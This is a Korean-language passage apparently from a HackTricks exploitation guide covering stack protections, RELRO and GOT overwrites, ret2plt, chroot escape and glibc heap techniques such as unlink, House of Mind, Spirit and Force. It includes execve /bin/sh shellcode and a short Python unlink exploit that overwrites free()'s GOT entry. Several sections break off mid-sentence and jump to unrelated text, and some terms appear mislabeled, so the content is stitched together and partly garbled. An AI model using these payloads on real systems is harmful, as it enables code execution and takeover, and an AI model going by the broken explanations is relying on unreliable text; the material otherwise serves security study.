스택 —> 24비트, delta\_stack —> 실제로는 11 (10번째 바이트부터 20번째 바이트까지 포함) —> 16바이트에 정렬 —> 스택의 실제 가능한 주소는 524,288개입니다.

환경 변수 및 인수는 스택의 버퍼보다 적게 이동합니다.

**Return-into-printf**

버퍼 오버플로우를 형식 문자열 오류로 변환하는 기술입니다. EIP를 함수의 printf로 대체하여 프로세스 상태에 대한 값을 얻기 위해 조작된 형식 문자열을 인수로 전달합니다.

**라이브러리 공격**

라이브러리는 16비트의 무작위 위치에 있습니다. 취약한 서버가 fork()를 호출하면 메모리 주소 공간이 자식 프로세스에 복제되고 그대로 유지됩니다. 따라서 libc의 usleep() 함수에 대해 "16"과 같은 인수를 전달하여 일반적보다 오래 걸릴 때 해당 함수를 찾을 수 있습니다. 해당 함수가 어디에 있는지 알면 delta\_mmap을 얻고 다른 값을 계산할 수 있습니다.

ASLR이 작동하는지 확실하게 하려면 64비트 아키텍처를 사용해야 합니다. 거기에는 브루트 포스 공격이 없습니다.

**StackGuard 및 StackShield**

**StackGuard**는 EIP 앞에 삽입됩니다 —> 0x000aff0d(null, \n, EndOfFile(EOF), \r) —> 여전히 취약한 함수 recv(), memcpy(), read(), bcoy() 및 EBP를 보호하지 않습니다.

**StackShield**는 StackGuard보다 더 복잡합니다.

모든 반환 EIP 주소를 테이블 (Global Return Stack)에 저장하여 오버플로우가 어떤 손상도 일으키지 않도록 합니다. 또한 두 주소를 비교하여 오버플로우가 발생했는지 확인할 수 있습니다.

반환 주소를 한계 값과 비교할 수도 있으므로 EIP가 데이터 공간과 같은 일반적인 위치로 이동하는지 확인할 수 있습니다. 그러나 이는 Ret-to-lib, ROP 또는 ret2ret으로 우회할 수 있습니다.

StackShield는 로컬 변수를 보호하지 않는 것을 볼 수 있습니다.

**Stack Smash Protector (ProPolice) -fstack-protector**

canary를 EBP 앞에 놓습니다. 버퍼가 다른 변수를 덮어쓸 수 없도록 지역 변수의 위치를 재정렬합니다.

또한, 스택 위에 (로컬 변수 위에) 전달된 인수의 안전한 복사본을 만들고 이 복사본을 인수로 사용합니다.

8개 미만의 요소로 구성된 배열이나 사용자 구조체의 일부인 버퍼를 보호할 수 없습니다.

canary는 "dev/urandom"에서 가져온 임의의 숫자이거나
### Relro

**Relro (Read only Relocation)**은 NX와 유사하게 메모리 권한에 영향을 미칩니다. 차이점은 NX가 스택을 실행 가능하게 만드는 반면, RELRO는 **일부 항목을 읽기 전용**으로 만들어서 우리가 그들에게 **쓸 수 없게** 합니다. 이것이 가장 흔히 우리가 **`got` 테이블 덮어쓰기**를 할 수 없게 하는 장애물이 되는 방법입니다. `got` 테이블은 libc 함수의 주소를 보유하고 있어서 바이너리가 주소를 알고 호출할 수 있습니다. `got` 테이블이 있는 바이너리의 메모리 권한이 relro가 있는 경우와 없는 경우를 살펴보겠습니다.

relro가 있는 경우:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
relro 없이:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
이진 파일 **relro가 없는** 경우, `fgets`의 `got` 항목 주소는 `0x404018`입니다. 메모리 매핑을 살펴보면 이 주소가 `0x404000`과 `0x405000` 사이에 있으며, 이는 **`rw` 권한**을 가지므로 읽고 쓸 수 있습니다. **relro가 있는** 이진 파일의 경우, 바이너리 실행 시 `got` 테이블 주소 (pie가 활성화되어 있으므로이 주소는 변경됨)는 `0x555555557fd0`입니다. 이 바이너리의 메모리 매핑에서는 `0x0000555555557000`과 `0x0000555555558000` 사이에 있으며, 이는 메모리 **권한 `r`**을 가지므로 읽기만 할 수 있습니다.

그렇다면 **우회**는 무엇인가요? 일반적으로 사용하는 우회 방법은 relro로 인해 읽기 전용이 되는 메모리 영역에 쓰지 않고, **코드 실행을 위한 다른 방법을 찾는 것**입니다.

참고로, 이를 위해 이진 파일은 실행 전에 함수의 주소를 알아야 합니다:

* Lazy 바인딩: 함수의 주소는 함수가 처음 호출될 때 검색됩니다. 따라서 실행 중에 GOT는 쓰기 권한이 필요합니다.
* Bind now: 함수의 주소는 실행의 시작에서 해결되며, 그런 다음 .got, .dtors, .ctors, .dynamic, .jcr과 같은 중요한 섹션에는 읽기 전용 권한이 부여됩니다. `` `** ``-z relro`**`y`**`-z now\`\*\*

프로그램이 Bind now를 사용하는지 확인하려면 다음을 수행할 수 있습니다:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
메모리에 바이너리가 로드되고 함수가 처음 호출될 때 PLT(Procedure Linkage Table)로 이동하여 GOT(Global Offset Table)로 점프(jmp)합니다. 그리고 해당 항목이 해결되지 않았음을 확인하고(PLT의 다음 주소를 포함), 런타임 링커 또는 rtfd를 호출하여 주소를 해결하고 GOT에 저장합니다.

함수를 호출할 때 PLT를 호출하면 해당 함수의 주소가 저장된 GOT의 주소로 이동하여 함수를 호출합니다. 그러나 함수가 처음 호출되는 경우 GOT에는 PLT의 다음 명령문이 있으므로 흐름은 PLT 코드(rtfd)를 따라가고 함수의 주소를 찾아 GOT에 저장하고 호출합니다.

바이너리를 메모리에 로드할 때 컴파일러는 프로그램을 실행할 때 로드해야 하는 데이터를 어느 오프셋에 배치해야 하는지 알려줍니다.

Lazy binding - 함수의 주소는 해당 함수가 처음 호출될 때 찾기 때문에 GOT에는 쓰기 권한이 있어서 찾을 때마다 거기에 저장하고 다시 찾을 필요가 없습니다.

Bind now - 프로그램을 로드할 때 함수의 주소를 찾고 .got, .dtors, .ctors, .dynamic, .jcr 섹션의 권한을 읽기 전용으로 변경합니다. -z relro 및 -z now

그럼에도 불구하고 일반적으로 프로그램은 이러한 옵션으로 복잡하지 않으므로 이러한 공격은 여전히 가능합니다.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** - BIND NOW를 사용하는지 확인하기 위해 사용합니다.

**Fortify Source -D_FORTIFY_SOURCE=1 또는 =2**

안전하지 않은 방식으로 데이터를 복사하는 함수를 식별하고 해당 함수를 안전한 함수로 변경합니다.

예를 들어:
char buf[16];
strcpy(buf, source);

이것을 안전하지 않다고 인식하고 strcpy()를 __strcpy_chk()로 변경하고 버퍼의 크기를 최대 복사 크기로 사용합니다.

=1 또는 =2의 차이점은 다음과 같습니다:

두 번째는 %n이 쓰기 권한이 있는 섹션에서 오는 것을 허용하지 않습니다. 또한 인수에 대한 직접 액세스 매개변수는 이전에 사용한 경우에만 사용할 수 있습니다. 즉, %2$d 및 %1$d를 사용한 경우에만 %3$d를 사용할 수 있습니다.

오류 메시지를 표시하기 위해 argv[0]을 사용하므로 다른 위치(전역 변수와 같은)의 주소를 넣으면 오류 메시지가 해당 변수의 내용을 표시합니다. 페이지 191

**Libsafe 대체**

활성화 방법: LD_PRELOAD=/lib/libsafe.so.2 또는 "/lib/libsave.so.2" > /etc/ld.so.preload

일부 안전하지 않은 함수 호출을 안전한 함수로 대체합니다. 표준화되지 않았습니다. (x86 전용, -fomit-frame-pointer로 컴파일된 경우, 정적 컴파일이 아닌 경우, 모든 취약한 함수가 안전한 함수로 변환되지 않으며 LD_PRELOAD는 suid가 설정된 바이너리에는 사용할 수 없음).

**ASCII Armored Address Space**

공유 라이브러리를 0x00000000에서 0x00ffffff로 로드하여 항상 0x00 바이트가 있는 것입니다. 그러나 이는 사실상 거의 모든 공격을 막지 못하며, 특히 리틀 엔디안에서는 더욱 그렇습니다.

**ret2plt**

ROP를 수행하여 plt의 strcpy@plt 함수를 호출하고 GOT 항목을 가리키고 호출하려는 함수(system())의 첫 번째 바이트를 복사합니다. 그런 다음 GOT+1을 가리키고 system()의 두 번째 바이트를 복사합니다. 마지막으로 GOT에 저장된 주소(system())를 호출합니다.

**Falso EBP**

EBP를 인수를 가리키는 레지스터로 사용하는 함수의 경우 EIP를 수정하여 system()을 가리키도록하려면 EBP도 수정해야합니다. 이를 위해 EBP를 임의의 2 바이트를 가진 메모리 영역을 가리키도록해야하고 그 후에 &"/bin/sh"의 주소를 가리키도록해야합니다.

**chroot()를 사용한 새로운 환경**

debootstrap -arch=i386 hardy /home/user - 특정 하위 디렉토리에 기본 시스템을 설치합니다.

관리자는 다음을 수행하여 이러한 환경에서 탈출 할 수 있습니다: mkdir foo; chroot foo; cd ..

**코드 인스트루멘테이션**

Valgrind - 오류 검색\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #이전 청크가 비어있음을 나타내는 비트가 1로 설정되어야 함**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, 2번째 청크가 비어있는지 확인하는 위치로 이동하기 위해 4바이트 앞으로 이동**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #페이로드의 시작에 8바이트의 패딩을 추가**

**got\_free = pack("\<I", 0x08048300 - 12) #free() 함수의 plt-12 주소 (free()가 두 번째 호출될 때 쉘코드가 실행되도록 덮어쓰일 주소)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #8바이트의 패딩으로 페이로드가 시작함**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2번째 청크를 수정하여 got\_free가 addr\_sc + 12를 가리키도록 함**

**os.system("./8.3.o " + payload)**

**unset() 역순으로 해제 (wargame)**

우리는 연속적인 3개의 청크를 제어하고, 예약된 순서와 반대로 해제합니다.

이 경우:

청크 c에는 쉘코드를 넣습니다.

청크 a는 b를 덮어쓰기 위해 사용되며, size가 PREV\_INUSE 비트가 꺼져있어 청크 a가 비어있는 것으로 간주됩니다.

또한, 헤더 b의 size를 -4로 덮어씁니다.

따라서 프로그램은 "a"가 비어있고 bin에 있는 것으로 생각하므로 unlink()를 호출하여 청크를 unlink()합니다. 그러나 PREV\_SIZE 헤더가 -4이므로 "a" 청크가 실제로 b+4에서 시작한다고 생각합니다. 즉, b+4에서 시작하는 청크에 unlink()를 수행하므로 b+12에는 "fd" 포인터가 있고, b+16에는 "bk" 포인터가 있습니다.

이렇게하면 bk에는 쉘코드의 주소를, fd에는 "puts()" 함수의 주소-12를 넣으면 페이로드가 완성됩니다.

**Frontlink 기법**

해제되는 청크의 인접한 청크 중 하나도 비어 있지 않은 경우 unlink() 대신에 frontlink()가 직접 호출됩니다.

공격 대상이 되는 malloc이 해제되지 않을 때 유용한 취약점입니다.

요구 사항:

데이터 입력 함수로 버퍼 오버플로우가 발생할 수 있는 버퍼

이와 인접한 버퍼는 해제되고 이전 버퍼의 헤더의 fd 필드가 수정됩니다.

512보다 크고 이전 버퍼보다 작은 크기의 해제할 버퍼

3단계 이전에 선언된 버퍼로 이전 버퍼의 prev\_size를 덮어쓸 수 있어야 합니다.

이렇게하면 두 개의 malloc을 제어할 수 있으며, 하나는 제어가 가능하지만 해제되는 것은 하나뿐인 exploit을 수행할 수 있습니다.

**Double free() 취약점**

동일한 포인터로 두 번 free()를 호출하면 두 개의 bin이 동일한 주소를 가리킵니다.

하나를 다시 사용하려면 문제없이 할당됩니다. 다른 것을 사용하려면 이전 할당과 동일한 공간이 할당되므로 "fd"와 "bk" 포인터가 이전 예약에서 쓸 데이터로 왜곡됩니다.

**After free()**

이전에 해제된 포인터가 제어 없이 다시 사용됩니다.

## **8 Heap Overflows: Exploits avanzados**

unlink() 및 frontlink() 기법은 unlink() 함수를 수정함으로써 제거되었습니다.

**The house of mind**

코드를 임의로 실행하기 위해 free()를 한 번만 호출하면 됩니다. 이전 버퍼에 의해 오버플로우되고 해제될 수 있는 두 번째 청크를 찾는 것이 중요합니다.

free() 호출은 public\_fREe(mem)을 호출하며 다음과 같이 작동합니다:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> 청크가 시작되는 주소 (mem-8)를 반환합니다.

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1]에서는 size 필드의 NON\_MAIN\_ARENA 비트를 확인하는데, 이 비트를 조작하여 체크가 true를 반환하고 heap\_for\_ptr()를 실행하도록 할 수 있습니다. heap\_for\_ptr()는 "mem"에 대해 and 연산을 수행하여 가장 뒤의 2.5바이트를 0으로 만들고 (예: 0x0804a000의 경우 0x08000000이 됨) 0x08000000->ar\_ptr에 액세스합니다 (마치 struct heap\_info인 것처럼).

따라서 예를 들어 0x0804a000에 청크를 제어할 수 있고 0x081002a0에 청크를 해제하려는 경우 0x08100000 주소에 도달하여 원하는 값을 쓸 수 있습니다. 예를 들어 0x0804a000을 쓸 수 있습니다. 두 번째 청크가 해제될 때 heap\_for\_ptr(ptr)->ar\_ptr이 0x08100000에 쓴 것을 발견할 것입니다 (0x081002a0에 대해 이전에 본 and 연산을 적용하고 거기서 처음 4바이트 값을 가져오기 때문입니다. 즉, ar\_ptr).

이렇게 하면 \_int\_free(ar\_ptr, mem)가 호출되며, 즉, \_int\_free(0x0804a000, 0x081002a0)이 호출됩니다.\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

위에서 본 바와 같이 av의 값을 제어할 수 있으므로 해제될 청크에 쓸 값을 작성할 수 있습니다.

unsorted\_chunks를 정의한 대로 알 수 있듯이:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p
이 기술은 unlink와 거의 동일한 패치가 적용되어 더 이상 적용되지 않습니다. 새로운 대상이 자신을 가리키고 있는지 확인합니다.

**Fastbin**

The house of mind의 변형입니다.

우리는 \_int\_free() 함수의 첫 번째 확인을 통과한 후 실행되는 다음 코드를 실행하고 싶습니다.

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

이렇게 하면 "fb"에는 GOT의 함수 주소가 들어가며, 이 주소에 덮어쓸 조각의 주소가 들어갑니다. 이를 위해서는 arena가 dtors 주소 근처에 있어야 합니다. 더 정확히 말하면 av->max\_fast가 덮어쓸 주소여야 합니다.

The House of Mind에서 우리가 av의 위치를 제어할 수 있다는 것을 알았습니다.

따라서 size 필드에 8 + NON\_MAIN\_ARENA + PREV\_INUSE를 설정하면 fastbin\_index()는 fastbins\[-1\]을 반환하고 이는 av->max\_fast를 가리킵니다.

이 경우 av->max\_fast가 덮어쓰여질 주소가 됩니다(가리키는 주소가 아니라 해당 위치가 덮어쓰여집니다).

또한 해제된 연속 조각은 8보다 커야 합니다. 우리는 해제된 조각의 크기가 8이므로 가짜 조각에는 8보다 큰 크기를 설정해야 합니다(또한 쉘코드가 해제된 조각에 들어갈 것이므로 처음에는 nops로 끝나는 jmp를 설정해야 합니다).

또한, 동일한 가짜 조각은 av->system\_mem보다 작아야 합니다. av->system\_mem은 스택에서 1848바이트 떨어진 곳에 있습니다.

\_DTOR\_END\_의 널 값과 GOT의 주소가 적으므로 이러한 섹션의 주소는 덮어쓰기에 사용할 수 없습니다. 따라서 fastbin을 사용하여 스택을 공격하는 방법을 살펴보겠습니다.

다른 공격 방법은 **av**를 스택으로 리디렉션하는 것입니다.

size를 8이 아닌 16으로 수정하면 fastbin\_index()는 fastbins\[0\]을 반환하고 이를 사용하여 스택을 덮어쓸 수 있습니다.

이를 위해서는 스택에 canary나 이상한 값이 없어야 합니다. 실제로 우리는 다음과 같은 상태여야 합니다: 4바이트 널 + EBP + RET

4바이트 널은 **av**가 해당 주소에 있을 것이고 **av**의 첫 번째 요소는 0이어야 하기 때문에 필요합니다.

**av->max\_fast**는 EBP가 되며 제약 조건을 우회하는 데 사용되는 값입니다.

**av->fastbins\[0\]**는 **p**의 주소로 덮어쓰여지며 RET이 됩니다. 이렇게 하면 쉘코드로 이동합니다.

또한, 스택에서 1484바이트 위에 있는 **av->system\_mem**에는 우리가 확인을 우회할 수 있는 많은 쓰레기가 있습니다.

또한, 해제된 연속 조각은 8보다 커야 합니다. 우리는 해제된 조각의 크기가 16이므로 가짜 조각에는 8보다 큰 크기를 설정해야 합니다(또한 쉘코드가 해제된 조각에 들어갈 것이므로 새로운 가짜 조각의 size 필드 이후의 nops로 끝나는 jmp를 설정해야 합니다).

**The House of Spirit**

이 경우 공격자가 조작 가능한 malloc 포인터(예: 오버플로우 가능한 변수 아래의 스택에 있는 포인터)를 가져야 합니다.

이렇게 하면 이 포인터를 원하는 곳으로 지정할 수 있습니다. 그러나 모든 위치가 유효한 것은 아닙니다. 가짜 조각의 크기는 av->max\_fast보다 작아야 하며, 더 구체적으로는 malloc()에 대한 미래 호출에서 요청된 크기 + 8과 동일해야 합니다. 따라서 만약 이 취약한 포인터 뒤에 malloc(40)이 호출된다고 가정한다면, 가짜 조각의 크기는 48과 같아야 합니다.

예를 들어, 프로그램이 사용자로부터 숫자를 입력받는다면 48을 입력하고 수정 가능한 malloc 포인터를 다음 4바이트(행운이 좋다면 EBP일 수 있음)로 지정할 수 있습니다. 이렇게 하면 48이 뒤로 이동하여 크기 헤더처럼 보이게 됩니다. 또한, ptr-4+48 주소는 여러 조건을 충족해야 합니다(이 경우 ptr=EBP). 즉, 8 < ptr-4+48 < av->system\_mem 여야 합니다.

이 조건이 충족되면 우리가 이전에 말한 malloc(40) 호출 시 EBP 주소가 할당됩니다. 공격자가 이 malloc에 쓸 수 있는 경우 EBP와 EIP를 원하는 주소로 덮어쓸 수 있습니다.

이것은 free()가 스택의 EBP를 가리키는 주소에 완벽한 크기의 조각이 있다는 것을 저장하기 때문입니다. 따라서 그 주소를 할당합니다.

**The House of Force**

필요한 것:

* wilderness를 덮어쓸 수 있는 조각의 오버플로우
* 사용자가 정의한 크기로 malloc()을 호출하는 것
* 사용자가 정의한 데이터로 malloc()을 호출하는 것

첫 번째로 wilderness 조각의 크기를 매우 큰 값(0xffffffff)으로 덮어씁니다. 이렇게 하면 충분히 큰 메모리 요청이 힙을 확장하지 않고 \_int\_malloc()에서 처리됩니다.

두 번째로 av->top을 공격자가 제어할 수 있는 메모리 영역(예: 스택)을 가리키도록 변경합니다. av->top에는 \&EIP - 8이 들어갑니다.

av->top을 공격자가 제어할 수 있는 메모리 영역을 가리키도록 덮어씌우기 위해 다음을 수행합니다:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

victim은 현재 wilderness 조각의 주소(av->top)를 가져오고 remainder는 해당 주소와 malloc()에 의해 요청된 바이트 수의 합입니다. 따라서 \&EIP-8이 0xbffff224에 있고 av->top이 0x080c2788을 포함한다면 다
## 개요

이 문서에서는 Linux에서의 기본적인 ESP(Exploit Specific Payload)를 이용한 공격 기법에 대해 다룹니다. 이 공격 기법은 두 개의 malloc을 예약하여, 두 번째 malloc이 해제되고 해당 bin에 들어간 후에 첫 번째 malloc에 오버플로우를 발생시킬 수 있도록 합니다. 즉, 오버플로우가 발생하기 전에 두 번째 조각보다 큰 malloc이 예약되어야 합니다.

공격자가 선택한 주소로 할당된 malloc을 제어할 수 있어야 합니다.

이 공격의 목표는 다음과 같습니다. 이미 해제되고 bin에 있는 힙에 오버플로우를 발생시킬 수 있다면, 해당 힙의 bk 포인터를 수정할 수 있습니다. bk 포인터를 수정하고 해당 조각이 bin의 첫 번째로 사용되도록 예약되면, bin은 가짜 주소(예: 스택이나 GOT)에 다음 조각이 있다고 잘못 알게 됩니다. 따라서 다른 조각이 다시 예약되고 공격자가 해당 조각에 권한이 있는 경우, 원하는 위치에 조각이 제공되고 쓸 수 있게 됩니다.

수정된 조각을 해제한 후에는 해제된 조각보다 큰 조각을 다시 예약해야 합니다. 이렇게 하면 수정된 조각이 unsorted bins에서 나와 해당 bin에 들어갈 수 있습니다.

bin에 들어간 후에는 오버플로우를 통해 bk 포인터를 수정해야 합니다. 이렇게 하면 bin은 충분한 malloc() 호출이 발생하여 수정된 bin을 다시 사용하고 다음 조각이 가짜 주소에 있다고 bin을 속일 수 있습니다. 그리고 원하는 조각을 제공합니다.

이 취약점이 가능한 한 빨리 실행되도록 하려면 다음과 같은 순서로 진행하는 것이 이상적입니다. 취약한 조각 예약, 수정될 조각 예약, 해당 조각 해제, 수정될 조각보다 큰 조각 예약, 조각 수정(취약점), 취약한 조각과 같은 크기의 조각 예약, 그리고 선택한 주소를 가리키는 두 번째 조각 예약입니다.

이 공격을 방지하기 위해 일반적으로 조각이 "가짜"가 아님을 확인하는 검사가 사용됩니다. 즉, 가짜 조각의 fd 포인터가 스택에 가리키는 조각인 경우를 확인합니다. 이 보호를 우회하려면 공격자는 어떤 방식으로든 (아마도 스택을 통해) 적절한 주소에 victim의 주소를 쓸 수 있어야 합니다. 이렇게 하면 가짜 조각처럼 보일 수 있습니다.

**LargeBin 손상**

이전과 동일한 요구 사항과 추가 요구 사항이 필요하며, 예약된 조각은 512보다 큰 크기여야 합니다.

이 공격은 이전과 동일하게 bk 포인터를 수정해야 하며, 모든 malloc() 호출이 필요하지만 수정된 조각의 크기를 조정하여 size - nb가 MINSIZE보다 작아야 합니다.

예를 들어, 1552를 size로 설정하여 1552 - 1544 = 8 < MINSIZE(음수가 되지 않도록 부호 없는 정수로 비교)가 되도록 합니다.

또한, 이를 더 어렵게 만들기 위해 패치가 도입되었습니다.

**Heap Spraying**

기본적으로 가능한 한 많은 힙 메모리를 예약하고, 이를 nops로 끝나는 셸코드로 채웁니다. 또한, 셸코드로 0x0c를 사용합니다. 따라서 0x0c0c0c0c 주소로 점프하려고 시도하며, 이렇게 하면 이 셸코드로 호출될 주소 중 어느 곳이든 덮어쓰일 경우 해당 위치로 점프하게 됩니다. 기본적으로 최대한 많이 예약하여 어떤 포인터가 덮어쓰여지는지 확인하고 0x0c0c0c0c로 점프하여 거기에 nops가 있는지 확인하는 전략입니다.

**Heap Feng Shui**

예약과 해제를 통해 메모리를 조각화하여 빈 조각 사이에 예약된 조각이 남도록 합니다. 버퍼 오버플로우를 발생시킬 버퍼는 이러한 조각 중 하나에 위치시킵니다.

**objdump -d 실행 파일** —> 함수들의 어셈블리 코드 표시\
**objdump -d ./프로그램 | grep 함수** —> 함수 주소 가져오기\
**objdump -d -Mintel ./shellcodeout** —> 셸코드가 실제로 우리의 셸코드인지 확인하고 OpCodes 가져오기\
**objdump -t ./exec | grep varBss** —> 심볼 테이블, 변수와 함수의 주소 가져오기\
**objdump -TR ./exec | grep exit(func lib)** —> 라이브러리 함수의 주소 가져오기 (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> GOT에 덮어쓸 puts의 주소 가져오기\
**objdump -D ./exec** —> plt 항목까지 모두 어셈블리 코드 표시\
**objdump -p -/exec**\
**Info functions strncmp —>** gdb에서 함수에 대한 정보

## 흥미로운 강의

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **참고 자료**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>로 AWS 해킹을 처음부터 전문가까지 배워보세요</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 확인하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
